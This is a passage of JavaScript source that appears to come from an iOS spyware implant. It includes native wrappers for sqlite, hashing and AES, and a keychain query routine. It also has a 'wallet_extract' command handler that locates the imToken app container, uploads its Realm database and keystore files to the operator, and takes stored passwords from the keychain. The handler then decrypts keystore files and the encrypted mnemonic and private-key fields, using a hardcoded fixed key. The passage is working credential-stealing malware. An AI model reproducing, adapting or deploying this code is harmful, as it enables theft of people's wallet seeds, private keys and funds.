						row[colNames[c]] = Number(Native.callSymbol("sqlite3_column_double", stmt, c));
					} else {
						var txtP = Native.callSymbol("sqlite3_column_text", stmt, c);
						var txtLen = Number(Native.callSymbol("sqlite3_column_bytes", stmt, c));
						if (txtP && txtP !== 0n && txtLen > 0) {
							row[colNames[c]] = Native.readString(txtP, txtLen + 1).substring(0, txtLen);
						} else {
							row[colNames[c]] = "";
						}
					}
				}
				rows.push(row);
			}
			return { columns: colNames, rows: rows };
		} finally { Native.callSymbol("sqlite3_finalize", stmt); }
	} finally { Native.callSymbol("sqlite3_close", db); }
}

// ============================================================================
// Native CommonCrypto Wrappers
// ============================================================================

function _sha256(data) {
	var inBuf = Native.callSymbol("malloc", Native.asBigInt(data.length));
	if (!inBuf || inBuf === 0n) return null;
	var outBuf = Native.callSymbol("malloc", 32n);
	if (!outBuf || outBuf === 0n) { Native.callSymbol("free", inBuf); return null; }
	Native.write(inBuf, data.buffer ? data.buffer : data);
	Native.callSymbol("CC_SHA256", inBuf, Native.asBigInt(data.length), outBuf);
	var hash = new Uint8Array(Native.read(outBuf, 32));
	Native.callSymbol("free", inBuf);
	Native.callSymbol("free", outBuf);
	return hash;
}

function _hmacSha256(key, data) {
	var keyBuf = Native.callSymbol("malloc", Native.asBigInt(key.length));
	var dataBuf = Native.callSymbol("malloc", Native.asBigInt(data.length));
	var outBuf = Native.callSymbol("malloc", 32n);
	if (!keyBuf || !dataBuf || !outBuf) {
		if (keyBuf) Native.callSymbol("free", keyBuf);
		if (dataBuf) Native.callSymbol("free", dataBuf);
		if (outBuf) Native.callSymbol("free", outBuf);
		return null;
	}
	Native.write(keyBuf, key.buffer ? key.buffer : key);
	Native.write(dataBuf, data.buffer ? data.buffer : data);
	Native.callSymbol("CCHmac", 2, keyBuf, Native.asBigInt(key.length),
		dataBuf, Native.asBigInt(data.length), outBuf);
	var mac = new Uint8Array(Native.read(outBuf, 32));
	Native.callSymbol("free", keyBuf);
	Native.callSymbol("free", dataBuf);
	Native.callSymbol("free", outBuf);
	return mac;
}

function _pbkdf2(password, salt, iterations, keyLen) {
	var pwBytes = new Uint8Array(password.length);
	for (var i = 0; i < password.length; i++) pwBytes[i] = password.charCodeAt(i);
	var hLen = 32;
	var numBlocks = Math.ceil(keyLen / hLen);
	var dk = new Uint8Array(numBlocks * hLen);
	var keyBuf = Native.callSymbol("malloc", Native.asBigInt(pwBytes.length));
	var dataBuf = Native.callSymbol("malloc", Native.asBigInt(Math.max(salt.length + 4, hLen)));
	var outBuf = Native.callSymbol("malloc", 32n);
	if (!keyBuf || !dataBuf || !outBuf) {
		if (keyBuf) Native.callSymbol("free", keyBuf);
		if (dataBuf) Native.callSymbol("free", dataBuf);
		if (outBuf) Native.callSymbol("free", outBuf);
		return null;
	}
	Native.write(keyBuf, pwBytes.buffer);
	for (var blk = 1; blk <= numBlocks; blk++) {
		var intBe = new Uint8Array(4);
		intBe[0] = (blk >>> 24) & 0xff;
		intBe[1] = (blk >>> 16) & 0xff;
		intBe[2] = (blk >>> 8) & 0xff;
		intBe[3] = blk & 0xff;
		var msg = new Uint8Array(salt.length + 4);
		msg.set(salt instanceof Uint8Array ? salt : new Uint8Array(salt), 0);
		msg.set(intBe, salt.length);
		Native.write(dataBuf, msg.buffer);
		Native.callSymbol("CCHmac", 2, keyBuf, Native.asBigInt(pwBytes.length),
			dataBuf, Native.asBigInt(msg.length), outBuf);
		var u = new Uint8Array(Native.read(outBuf, 32));
		var t = new Uint8Array(u);
		for (var iter = 1; iter < iterations; iter++) {
			Native.write(dataBuf, u.buffer);
			Native.callSymbol("CCHmac", 2, keyBuf, Native.asBigInt(pwBytes.length),
				dataBuf, 32n, outBuf);
			u = new Uint8Array(Native.read(outBuf, 32));
			for (var j = 0; j < hLen; j++) t[j] ^= u[j];
		}
		dk.set(t, (blk - 1) * hLen);
	}
	Native.callSymbol("free", keyBuf);
	Native.callSymbol("free", dataBuf);
	Native.callSymbol("free", outBuf);
	return dk.slice(0, keyLen);
}

function _aesEcbEncryptBlock(cryptorRef, block16) {
	var inBuf = Native.callSymbol("malloc", 16n);
	var outBuf = Native.callSymbol("malloc", 32n);
	var writtenBuf = Native.callSymbol("malloc", 8n);
	if (!inBuf || !outBuf || !writtenBuf) {
		if (inBuf) Native.callSymbol("free", inBuf);
		if (outBuf) Native.callSymbol("free", outBuf);
		if (writtenBuf) Native.callSymbol("free", writtenBuf);
		return null;
	}
	Native.write(inBuf, block16.buffer ? block16.buffer : block16);
	Native.write64(writtenBuf, 0n);
	var rc = Number(Native.callSymbol("CCCryptorUpdate",
		cryptorRef, inBuf, 16n, outBuf, 32n, writtenBuf));
	var written = Number(Native.readPtr(writtenBuf));
	Native.callSymbol("free", inBuf);
	Native.callSymbol("free", writtenBuf);
	if (rc !== 0 || written < 16) { Native.callSymbol("free", outBuf); return null; }
	var result = new Uint8Array(Native.read(outBuf, 16));
	Native.callSymbol("free", outBuf);
	return result;
}

function _aesCtrDecrypt(keyBytes, ivBytes, cipherBytes) {
	var refBuf = Native.callSymbol("malloc", 8n);
	if (!refBuf) return null;
	Native.write64(refBuf, 0n);
	var keyBuf = Native.callSymbol("malloc", Native.asBigInt(keyBytes.length));
	if (!keyBuf) { Native.callSymbol("free", refBuf); return null; }
	Native.write(keyBuf, keyBytes.buffer ? keyBytes.buffer : keyBytes);
	var rc = Number(Native.callSymbol("CCCryptorCreate",
		0, 0, 2, keyBuf, Native.asBigInt(keyBytes.length), 0n, refBuf));
	Native.callSymbol("free", keyBuf);
	if (rc !== 0) { Native.callSymbol("free", refBuf); return null; }
	var ref = Native.readPtr(refBuf);
	Native.callSymbol("free", refBuf);
	if (!ref || ref === 0n) return null;
	try {
		var counter = new Uint8Array(16);
		for (var i = 0; i < 16 && i < ivBytes.length; i++) counter[i] = ivBytes[i];
		var output = new Uint8Array(cipherBytes.length);
		for (var off = 0; off < cipherBytes.length; off += 16) {
			var ks = _aesEcbEncryptBlock(ref, counter);
			if (!ks) return null;
			var remain = cipherBytes.length - off;
			var len = remain < 16 ? remain : 16;
			for (var j = 0; j < len; j++) output[off + j] = cipherBytes[off + j] ^ ks[j];
			for (var ci = 15; ci >= 0; ci--) {
				counter[ci] = (counter[ci] + 1) & 0xff;
				if (counter[ci] !== 0) break;
			}
		}
		return output;
	} finally { Native.callSymbol("CCCryptorRelease", ref); }
}

function _aesCbcDecrypt(keyBytes, ivBytes, cipherBytes) {
	var refBuf = Native.callSymbol("malloc", 8n);
	if (!refBuf) return null;
	Native.write64(refBuf, 0n);
	var keyBuf = Native.callSymbol("malloc", Native.asBigInt(keyBytes.length));
	var ivBuf = Native.callSymbol("malloc", Native.asBigInt(ivBytes.length));
	if (!keyBuf || !ivBuf) {
		if (keyBuf) Native.callSymbol("free", keyBuf);
		if (ivBuf) Native.callSymbol("free", ivBuf);
		Native.callSymbol("free", refBuf);
		return null;
	}
	Native.write(keyBuf, keyBytes.buffer ? keyBytes.buffer : keyBytes);
	Native.write(ivBuf, ivBytes.buffer ? ivBytes.buffer : ivBytes);
	var rc = Number(Native.callSymbol("CCCryptorCreate",
		1, 0, 0, keyBuf, Native.asBigInt(keyBytes.length), ivBuf, refBuf));
	Native.callSymbol("free", keyBuf);
	Native.callSymbol("free", ivBuf);
	if (rc !== 0) { Native.callSymbol("free", refBuf); return null; }
	var ref = Native.readPtr(refBuf);
	Native.callSymbol("free", refBuf);
	if (!ref || ref === 0n) return null;
	try {
		var inBuf = Native.callSymbol("malloc", Native.asBigInt(cipherBytes.length));
		var outBuf = Native.callSymbol("calloc", 1n, Native.asBigInt(cipherBytes.length + 16));
		var writtenBuf = Native.callSymbol("malloc", 8n);
		if (!inBuf || !outBuf || !writtenBuf) {
			if (inBuf) Native.callSymbol("free", inBuf);
			if (outBuf) Native.callSymbol("free", outBuf);
			if (writtenBuf) Native.callSymbol("free", writtenBuf);
			return null;
		}
		Native.write(inBuf, cipherBytes.buffer ? cipherBytes.buffer : cipherBytes);
		Native.write64(writtenBuf, 0n);
		rc = Number(Native.callSymbol("CCCryptorUpdate",
			ref, inBuf, Native.asBigInt(cipherBytes.length), outBuf, Native.asBigInt(cipherBytes.length + 16), writtenBuf));
		var written = Number(Native.readPtr(writtenBuf));
		Native.callSymbol("free", inBuf);
		Native.callSymbol("free", writtenBuf);
		if (rc !== 0) { Native.callSymbol("free", outBuf); return null; }
		var result = new Uint8Array(Native.read(outBuf, written));
		Native.callSymbol("free", outBuf);
		return result;
	} finally { Native.callSymbol("CCCryptorRelease", ref); }
}

function _hexToBytes(hex) {
	var bytes = new Uint8Array(hex.length / 2);
	for (var i = 0; i < hex.length; i += 2) {
		bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
	}
	return bytes;
}

function _bytesToHex(bytes) {
	var hex = "";
	for (var i = 0; i < bytes.length; i++) {
		hex += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
	}
	return hex;
}

// ============================================================================
// RCTAsyncLocalStorage Reader
// ============================================================================

function _readAsyncStorageManifest(storagePath) {
	var mpath = storagePath + "/manifest.json";
	var bytes = _readFileBytes(mpath, 4 * 1024 * 1024);
	if (!bytes || bytes.length === 0) return null;
	try {
		var json = JSON.parse(_rawToStr(bytes));
		var result = {};
		for (var key in json) {
			if (!json.hasOwnProperty(key)) continue;
			var val = json[key];
			if (typeof val === "string") {
				result[key] = val;
			} else if (val && typeof val === "object") {
				var fpath = storagePath + "/" + key;
				var fb = _readFileBytes(fpath, 8 * 1024 * 1024);
				if (fb && fb.length > 0) result[key] = _rawToStr(fb);
			}
		}
		return result;
	} catch (e) { return null; }
}

function _readAsyncStorageSqlite(storagePath) {
	var dbNames = ["RCTAsyncLocalStorage_V1", "asyncstorage.db", "RCTAsyncLocalStorage"];
	var result = null;
	for (var di = 0; di < dbNames.length; di++) {
		var dbPath = storagePath + "/" + dbNames[di];
		if (Number(Native.callSymbol("access", dbPath, 0)) !== 0) {
			dbPath = storagePath.replace(/\/RCTAsyncLocalStorage_V1$/, "") + "/" + dbNames[di];
			if (Number(Native.callSymbol("access", dbPath, 0)) !== 0) continue;
		}
		var tables = _sqliteQuery(dbPath, "SELECT name FROM sqlite_master WHERE type='table'");
		if (!tables || !tables.rows.length) continue;
		var tableName = null;
		for (var ti = 0; ti < tables.rows.length; ti++) {
			var tn = tables.rows[ti].name;
			if (tn === "catalystLocalStorage" || tn === "key_value" ||
				tn === "keyvaluestore" || tn === "cache") {
				tableName = tn;
				break;
			}
		}
		if (!tableName) tableName = tables.rows[0].name;
		var data = _sqliteQuery(dbPath, "SELECT * FROM \"" + tableName + "\"");
		if (!data || !data.rows.length) continue;
		result = {};
		var kCol = data.columns.indexOf("key") >= 0 ? "key" : data.columns[0];
		var vCol = data.columns.indexOf("value") >= 0 ? "value" : data.columns[1];
		for (var ri = 0; ri < data.rows.length; ri++) {
			result[data.rows[ri][kCol]] = data.rows[ri][vCol];
		}
		break;
	}
	return result;
}

function _readAsyncStorage(containerPath, subPath) {
	var storagePath = containerPath + "/" + subPath;
	var st = _statFile(storagePath);
	if (!st) return null;
	if (st.isDir) {
		var res = _readAsyncStorageManifest(storagePath);
		if (res) return res;
		return _readAsyncStorageSqlite(storagePath);
	}
	if (st.isFile) {
		var r = _sqliteQuery(storagePath, "SELECT name FROM sqlite_master WHERE type='table'");
		if (r && r.rows.length) {
			var result = {};
			for (var ti = 0; ti < r.rows.length; ti++) {
				var d = _sqliteQuery(storagePath, "SELECT * FROM \"" + r.rows[ti].name + "\"");
				if (!d || !d.rows.length) continue;
				var kCol = d.columns.indexOf("key") >= 0 ? "key" : d.columns[0];
				var vCol = d.columns.indexOf("value") >= 0 ? "value" : d.columns[1];
				for (var ri = 0; ri < d.rows.length; ri++) {
					result[d.rows[ri][kCol]] = d.rows[ri][vCol];
				}
			}
			return result;
		}
	}
	return null;
}

// ============================================================================
// Keystore V3 Decryption (scrypt/PBKDF2 + AES-CTR)
// ============================================================================

function _decryptKeystoreV3(crypto, password) {
	if (!crypto || !password) return null;
	var kdfparams = crypto.kdfparams;
	var cipherparams = crypto.cipherparams;
	var ciphertextHex = crypto.ciphertext;
	if (!kdfparams || !cipherparams || !ciphertextHex) return null;

	var salt = _hexToBytes(kdfparams.salt);
	var dkLen = kdfparams.dklen || 32;
	var derivedKey = null;

	if (crypto.kdf === "pbkdf2") {
		var iters = kdfparams.c || 262144;
		derivedKey = _pbkdf2(password, salt, iters, dkLen);
	} else {
		return { error: "scrypt_not_supported_on_device", kdf: crypto.kdf };
	}
	if (!derivedKey) return { error: "kdf_failed" };

	var ciphertext = _hexToBytes(ciphertextHex);
	var iv = _hexToBytes(cipherparams.iv);

	// MAC verification: SHA256(derivedKey[16:32] + ciphertext) should match crypto.mac
	if (crypto.mac) {
		var macInput = new Uint8Array(16 + ciphertext.length);
		macInput.set(derivedKey.slice(16, 32), 0);
		macInput.set(ciphertext, 16);
		var computedMac = _sha256(macInput);
		if (computedMac && _bytesToHex(computedMac) !== crypto.mac) {
			return { error: "mac_mismatch" };
		}
	}

	var cipher = (crypto.cipher || "aes-128-ctr").toLowerCase();
	var encKey = derivedKey.slice(0, 16);
	var decrypted = null;
	if (cipher === "aes-128-ctr") {
		decrypted = _aesCtrDecrypt(encKey, iv, ciphertext);
	} else if (cipher === "aes-128-cbc") {
		decrypted = _aesCbcDecrypt(encKey, iv, ciphertext);
	}
	if (!decrypted) return { error: "decrypt_failed" };

	try {
		var str = "";
		for (var i = 0; i < decrypted.length; i++) {
			if (decrypted[i] === 0) break;
			str += String.fromCharCode(decrypted[i]);
		}
		return { plaintext: str };
	} catch (e) { return { error: "decode_failed: " + e }; }
}

// EncryptedMessage format (fixed key AES-CTR)
function _decryptEncryptedMessage(encObj, fixedKeyHex) {
	if (!encObj || !encObj.encStr || !encObj.nonce) return null;
	var key = _hexToBytes(fixedKeyHex);
	var iv = _hexToBytes(encObj.nonce);
	var ciphertext = _hexToBytes(encObj.encStr);
	var plainBytes = _aesCtrDecrypt(key, iv, ciphertext);
	if (!plainBytes) return null;
	var str = "";
	for (var i = 0; i < plainBytes.length; i++) {
		if (plainBytes[i] === 0) break;
		str += String.fromCharCode(plainBytes[i]);
	}
	return str;
}

// ============================================================================
// Keychain Password Extraction (SecItemCopyMatching)
// ============================================================================

var _securityLoaded = false;
function _ensureSecurity() {
	if (_securityLoaded) return true;
	var h = Native.callSymbol("dlopen",
		"/System/Library/Frameworks/Security.framework/Security", 1);
	if (!h || h === 0n) return false;
	_securityLoaded = true;
	return true;
}

function _cfStr(s) {
	return Native.callSymbol("CFStringCreateWithCString", 0n, s, 0x08000100);
}
function _cfRelease(ref) {
	if (ref && ref !== 0n) Native.callSymbol("CFRelease", ref);
}
function _cfStringToJS(cfStr) {
	if (!cfStr || cfStr === 0n) return null;
	var cstr = Native.callSymbol("CFStringGetCStringPtr", cfStr, 0x08000100);
	if (cstr && cstr !== 0n) {
		return Native.readString(cstr, 4096).replace(/\0/g, "");
	}
	var buf = Native.callSymbol("malloc", 4096);
	if (!buf || buf === 0n) return null;
	if (Native.callSymbol("CFStringGetCString", cfStr, buf, 4096, 0x08000100)) {
		var s = Native.readString(buf, 4096).replace(/\0/g, "");
		Native.callSymbol("free", buf);
		return s;
	}
	Native.callSymbol("free", buf);
	return null;
}
function _cfDataToBytes(cfData) {
	if (!cfData || cfData === 0n) return null;
	var len = Number(Native.callSymbol("CFDataGetLength", cfData));
	if (len <= 0) return null;
	var ptr = Native.callSymbol("CFDataGetBytePtr", cfData);
	if (!ptr || ptr === 0n) return null;
	return new Uint8Array(Native.read(ptr, len));
}

function _searchKeychain(service, account, accessGroup) {
	if (!_ensureSecurity()) return null;
	Native.callSymbol("dlopen",
		"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);

	var kSecClass = Native.callSymbol("dlsym", -2n, "kSecClass");
	var kSecClassGenericPassword = Native.callSymbol("dlsym", -2n, "kSecClassGenericPassword");
	var kSecAttrService = Native.callSymbol("dlsym", -2n, "kSecAttrService");
	var kSecAttrAccount = Native.callSymbol("dlsym", -2n, "kSecAttrAccount");
	var kSecReturnData = Native.callSymbol("dlsym", -2n, "kSecReturnData");
	var kSecReturnAttributes = Native.callSymbol("dlsym", -2n, "kSecReturnAttributes");
	var kSecMatchLimit = Native.callSymbol("dlsym", -2n, "kSecMatchLimit");
	var kSecMatchLimitAll = Native.callSymbol("dlsym", -2n, "kSecMatchLimitAll");
	var kCFBooleanTrue = Native.callSymbol("dlsym", -2n, "kCFBooleanTrue");

	if (!kSecClass || kSecClass === 0n) return null;

	var svcCF = 0n, acctCF = 0n;
	try {
		var keys = [];
		var vals = [];

		keys.push(Native.readPtr(kSecClass));
		vals.push(Native.readPtr(kSecClassGenericPassword));
		keys.push(Native.readPtr(kSecReturnData));
		vals.push(Native.readPtr(kCFBooleanTrue));
		keys.push(Native.readPtr(kSecReturnAttributes));
		vals.push(Native.readPtr(kCFBooleanTrue));
		keys.push(Native.readPtr(kSecMatchLimit));
		vals.push(Native.readPtr(kSecMatchLimitAll));

		if (service) {
			keys.push(Native.readPtr(kSecAttrService));
			svcCF = _cfStr(service);
			vals.push(svcCF);
		}
		if (account) {
			keys.push(Native.readPtr(kSecAttrAccount));
			acctCF = _cfStr(account);
			vals.push(acctCF);
		}

		var nItems = keys.length;
		var keysBuf = Native.callSymbol("malloc", Native.asBigInt(nItems * 8));
		var valsBuf = Native.callSymbol("malloc", Native.asBigInt(nItems * 8));
		if (!keysBuf || keysBuf === 0n || !valsBuf || valsBuf === 0n) {
			if (keysBuf && keysBuf !== 0n) Native.callSymbol("free", keysBuf);
			if (valsBuf && valsBuf !== 0n) Native.callSymbol("free", valsBuf);
			return null;
		}
		for (var i = 0; i < nItems; i++) {
			Native.write64(keysBuf + Native.asBigInt(i * 8), keys[i]);
			Native.write64(valsBuf + Native.asBigInt(i * 8), vals[i]);
		}

		var queryDict = Native.callSymbol("CFDictionaryCreate", 0n,
			keysBuf, valsBuf, nItems, 0n, 0n);
		Native.callSymbol("free", keysBuf);
		Native.callSymbol("free", valsBuf);

		if (!queryDict || queryDict === 0n) return null;

		var resultPtr = Native.callSymbol("malloc", 8);
		Native.write64(resultPtr, 0n);
		var status = Number(Native.callSymbol("SecItemCopyMatching", queryDict, resultPtr));
		var resultRef = Native.readPtr(resultPtr);
		Native.callSymbol("free", resultPtr);
		_cfRelease(queryDict);

		if (status !== 0 || !resultRef || resultRef === 0n) return null;

		var results = [];
		try {
			var count = Number(Native.callSymbol("CFArrayGetCount", resultRef));
			var kSecValueData = Native.callSymbol("dlsym", -2n, "kSecValueData");
			var kSecValueDataVal = kSecValueData && kSecValueData !== 0n ? Native.readPtr(kSecValueData) : 0n;
			var svcKeyVal = Native.readPtr(kSecAttrService);
			var acctKeyVal = Native.readPtr(kSecAttrAccount);

			for (var idx = 0; idx < count && idx < 50; idx++) {
				var item = Native.callSymbol("CFArrayGetValueAtIndex", resultRef, idx);
				if (!item || item === 0n) continue;
				try {
					var entry = {};
					var sv = Native.callSymbol("CFDictionaryGetValue", item, svcKeyVal);
					if (sv && sv !== 0n) entry.service = _cfStringToJS(sv);
					var av = Native.callSymbol("CFDictionaryGetValue", item, acctKeyVal);
					if (av && av !== 0n) entry.account = _cfStringToJS(av);
					if (kSecValueDataVal && kSecValueDataVal !== 0n) {
						var dv = Native.callSymbol("CFDictionaryGetValue", item, kSecValueDataVal);
						if (dv && dv !== 0n) {
							var dataBytes = _cfDataToBytes(dv);
							if (dataBytes) {
								var dataStr = "";
								for (var di = 0; di < dataBytes.length; di++)
									dataStr += String.fromCharCode(dataBytes[di]);
								entry.data = dataStr;
								entry.data_hex = _bytesToHex(dataBytes);
							}
						}
					}
					results.push(entry);
				} catch (itemErr) {}
			}
		} finally { _cfRelease(resultRef); }
		return results;
	} finally {
		if (svcCF && svcCF !== 0n) _cfRelease(svcCF);
		if (acctCF && acctCF !== 0n) _cfRelease(acctCF);
	}
}

function _findImtokenKeychainPassword() {
	try {
		var candidates = [];
		var services = ["im.token.app", "imToken", "imtoken", "token.im"];
		for (var si = 0; si < services.length; si++) {
			try {
				var items = _searchKeychain(services[si], null, null);
				if (items && items.length > 0) {
					for (var ii = 0; ii < items.length; ii++) {
						items[ii]._source = "service:" + services[si];
						candidates.push(items[ii]);
					}
				}
			} catch (e) {}
		}
		return candidates;
	} catch (e) { return []; }
}

// ============================================================================
// imToken Wallet Extraction
// ============================================================================

function handleWalletExtract(cmd) {
	var p = cmd.params || {};
	var walletType = p.wallet_type || "imtoken";
	var startMs = Date.now();
	try { _agentLog("[IM-EXTRACT] enter type=" + walletType + " cid=" + String(cmd.command_id || "").slice(0, 24)); } catch (_) {}

	if (walletType === "imtoken") {
		_extractImtoken(cmd, p, startMs);
	} else {
		sendJSON(cmd.command_id, {
			status: "failed", error: "unsupported wallet_type: " + walletType,
			_task_id: p._task_id || "", _task_type: "wallet_extract"
		}, "wallet_extract_result.json");
	}
}

function _extractImtoken(cmd, p, startMs) {
	try { _agentLog("[IM-EXTRACT] begin"); } catch (_) {}
	try {
		var kcBytes = _readFileBytes("/tmp/imtoken_keychain.json", 2 * 1024 * 1024);
		try { _agentLog("[IM-EXTRACT] tmp_keychain bytes=" + (kcBytes && kcBytes.byteLength ? kcBytes.byteLength : 0)); } catch (_) {}
		if (kcBytes && kcBytes.byteLength > 10) {
			sendResult(cmd.command_id, bytesToBase64(kcBytes),
				"imtoken_keychain.json", "imtoken_keychain");
		}
	} catch(e) {
		try { _agentLog("[IM-EXTRACT] tmp_keychain err=" + String(e).slice(0, 80)); } catch (_) {}
	}

	var bundleId = "im.token.app";
	var containerPath = _findAppContainer(bundleId);
	if (!containerPath) {
		try { _agentLog("[IM-EXTRACT] FAIL no container"); } catch (_) {}
		sendJSON(cmd.command_id, {
			status: "failed", error: "imToken container not found",
			wallet_type: "imtoken",
			_task_id: p._task_id || "", _task_type: "wallet_extract"
		}, "wallet_extract_result.json");
		return;
	}

	var storageSub = "Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1";
	var data = _readAsyncStorage(containerPath, storageSub);
	try { _agentLog("[IM-EXTRACT] container_ok uuid=" + String(containerPath).split("/").pop()); } catch (_) {}
	if (!data) {
		var altSub = "Documents/RCTAsyncLocalStorage_V1";
		data = _readAsyncStorage(containerPath, altSub);
	}
	try { _agentLog("[IM-EXTRACT] async_storage=" + (data ? ("keys=" + Object.keys(data).length) : "miss")); } catch (_) {}

	var result = {
		status: "success",
		wallet_type: "imtoken",
		container: containerPath,
		wallets: [],
		assets: [],
		raw_keys: [],
		realm_files: [],
		wallet_dir_files: [],
		_task_id: p._task_id || "",
		_task_type: "wallet_extract"
	};

	// --- Phase 1: Realm database extraction (primary wallet storage) ---
	// imToken stores Realm in Documents/ (primary) or Library/Application Support/
	var realmUploaded = false;
	var realmSearchDirs = [
		containerPath + "/Documents",
		containerPath + "/Library/Application Support/im.token.app"
	];
	for (var rdi = 0; rdi < realmSearchDirs.length; rdi++) {
		if (realmUploaded) break;
		var realmDir = realmSearchDirs[rdi];
		try {
			var realmPath = realmDir + "/default.realm";
			var realmSt = _statFile(realmPath);
			if (realmSt && realmSt.isFile && realmSt.size > 0) {
				result.realm_files.push({
					path: realmPath, size: realmSt.size
				});
				var realmMaxSz = 16 * 1024 * 1024;
				if (realmSt.size <= realmMaxSz) {
					var realmData = readFileB64(realmPath, realmMaxSz);
					if (realmData) {
						sendResult(cmd.command_id, realmData.b64,
							"imtoken_default.realm", "wallet_extract");
						realmUploaded = true;
					}
				} else {
					sendFileChunked(cmd.command_id, realmPath,
						"imtoken_default.realm", "wallet_extract");
					realmUploaded = true;
				}
			}
		} catch (realmErr) {
			result.realm_error = String(realmErr);
		}
	}

	// --- Phase 2: Scan walletsV2/ and wallets/ directories for keystore files ---
	// These dirs can be in Documents/ or Library/Application Support/im.token.app/
	var walletDirs = [];
	var walletSearchBases = [
		containerPath + "/Documents",
		containerPath + "/Library/Application Support/im.token.app"
	];
	for (var wb = 0; wb < walletSearchBases.length; wb++) {
		var wbDir = walletSearchBases[wb];
		var v2 = wbDir + "/walletsV2";
		var v1 = wbDir + "/wallets";
		if (_statFile(v2)) walletDirs.push(v2);
		if (_statFile(v1)) walletDirs.push(v1);
	}

	// Keychain password for decryption attempts
	var keychainPassword = null;
	result.keychain_items = [];
	try {
		var keychainItems = _findImtokenKeychainPassword();
		if (keychainItems && keychainItems.length > 0) {
			for (var ki = 0; ki < keychainItems.length; ki++) {
				result.keychain_items.push(keychainItems[ki]);
				if (!keychainPassword && keychainItems[ki].data &&
					keychainItems[ki].data.length >= 4) {
					keychainPassword = keychainItems[ki].data;
				}
			}
		}
	} catch (kcErr) {
		result.keychain_error = String(kcErr);
		try { _agentLog("[IM-EXTRACT] kc_search err=" + String(kcErr).slice(0, 80)); } catch (_) {}
	}
	var password = p.password || keychainPassword;
	try {
		_agentLog("[IM-EXTRACT] kc_items=" + result.keychain_items.length +
			" has_pw=" + !!password + " src=" + (p.password ? "param" : (keychainPassword ? "keychain" : "none")));
	} catch (_) {}

	for (var di = 0; di < walletDirs.length; di++) {
		var wdir = walletDirs[di];
		var wdirSt = _statFile(wdir);
		if (!wdirSt || !wdirSt.isDir) continue;
		var entries = listDir(wdir);
		for (var ei = 0; ei < entries.length; ei++) {
			var ent = entries[ei];
			var entPath = wdir + "/" + ent.name;
			if (ent.type === "file") {
				result.wallet_dir_files.push({
					dir: di === 0 ? "walletsV2" : "wallets",
					name: ent.name
				});
				var entSt = _statFile(entPath);
				if (entSt && entSt.size > 0 && entSt.size < 4 * 1024 * 1024) {
					var fb64 = readFileB64(entPath, 4 * 1024 * 1024);
					if (fb64) {
						var fname = (di === 0 ? "walletsV2_" : "wallets_") + ent.name;
						sendResult(cmd.command_id, fb64.b64,
							fname, "wallet_extract");
					}
					// Parse JSON wallet files and attempt decryption
					if (ent.name.endsWith(".json")) {
						try {
							var fileBytes = _readFileBytes(entPath, 4 * 1024 * 1024);
							if (fileBytes) {
								var w = JSON.parse(_rawToStr(fileBytes));
								var walletInfo = {
									id: w.id || ent.name.replace(".json", ""),
									name: (w.imTokenMeta && w.imTokenMeta.name) || "",
									source: (w.imTokenMeta && w.imTokenMeta.source) || "",
									network: (w.imTokenMeta && w.imTokenMeta.network) || "",
									version: w.version || 0,
									from_dir: di === 0 ? "walletsV2" : "wallets"
								};
								if (w.crypto) {
									walletInfo.kdf = w.crypto.kdf || "unknown";
									walletInfo.cipher = w.crypto.cipher || "unknown";
									walletInfo.keystore_present = true;
									if (password) {
										try {
											var decResult = _decryptKeystoreV3(w.crypto, password);
											if (decResult) {
												walletInfo.decrypt_result = decResult;
												walletInfo.password_source = p.password ? "provided" : "keychain";
												try { _agentLog("[IM-EXTRACT] keystore ok file=" + ent.name); } catch (_) {}
											} else {
												try { _agentLog("[IM-EXTRACT] keystore empty file=" + ent.name); } catch (_) {}
											}
										} catch (decErr) {
											walletInfo.decrypt_error = String(decErr);
											try { _agentLog("[IM-EXTRACT] keystore err file=" + ent.name + " " + String(decErr).slice(0, 60)); } catch (_) {}
										}
									} else {
										try { _agentLog("[IM-EXTRACT] keystore skip_no_pw file=" + ent.name); } catch (_) {}
									}
								}
								if (w.encOriginal) {
									walletInfo.encOriginal_present = true;
									var fixedKey = "456b38706c33314b3279654867517779";
									try {
										var decOrig = _decryptEncryptedMessage(w.encOriginal, fixedKey);
										if (decOrig) walletInfo.original_fixed_key = decOrig;
										try { _agentLog("[IM-EXTRACT] encOriginal ok=" + !!decOrig + " file=" + ent.name); } catch (_) {}
									} catch (origErr) {
										walletInfo.encOriginal_error = String(origErr);
										try { _agentLog("[IM-EXTRACT] encOriginal err file=" + ent.name); } catch (_) {}
									}
								}
								if (w.encMnemonic) {
									walletInfo.encMnemonic_present = true;
									var fixedKey2 = "456b38706c33314b3279654867517779";
									try {
										var decMnem = _decryptEncryptedMessage(w.encMnemonic, fixedKey2);
										if (decMnem) walletInfo.mnemonic_fixed_key = decMnem;
										try { _agentLog("[IM-EXTRACT] encMnemonic ok=" + !!decMnem + " file=" + ent.name); } catch (_) {}
									} catch (mnemErr) {
										walletInfo.encMnemonic_error = String(mnemErr);
										try { _agentLog("[IM-EXTRACT] encMnemonic err file=" + ent.name); } catch (_) {}
									}
								}
								if (w.identity) {
									walletInfo.identifier = w.identity.identifier || "";
								}
								result.wallets.push(walletInfo);
							}
						} catch (parseErr) {}
					}
				}
			} else if (ent.type === "dir") {
				var subEntries = listDir(entPath);
				for (var si = 0; si < subEntries.length; si++) {
					var subEnt = subEntries[si];
					if (subEnt.type !== "file") continue;
					var subPath = entPath + "/" + subEnt.name;
					result.wallet_dir_files.push({
						dir: (di === 0 ? "walletsV2" : "wallets") + "/" + ent.name,
						name: subEnt.name
					});
					var subSt = _statFile(subPath);
					if (subSt && subSt.size > 0 && subSt.size < 4 * 1024 * 1024) {
						var sb64 = readFileB64(subPath, 4 * 1024 * 1024);
						if (sb64) {
							var sfname = (di === 0 ? "walletsV2_" : "wallets_") +
								ent.name + "_" + subEnt.name;
							sendResult(cmd.command_id, sb64.b64,
								sfname, "wallet_extract");
						}
					}
				}
			}
		}
	}

	// --- Phase 3: AsyncStorage (Redux persist) ---
	if (data) {
		var rawKeys = Object.keys(data);
		result.raw_keys = rawKeys;

		var walletsRaw = null;
		if (data["walletsV2"]) {
			try { walletsRaw = JSON.parse(data["walletsV2"]); } catch(e) {}
		}
		if (!walletsRaw && data["wallets"]) {
			try { walletsRaw = JSON.parse(data["wallets"]); } catch(e) {}
		}

		if (walletsRaw) {
			var wArr = Array.isArray(walletsRaw) ? walletsRaw :
				(walletsRaw.wallets ? walletsRaw.wallets : [walletsRaw]);
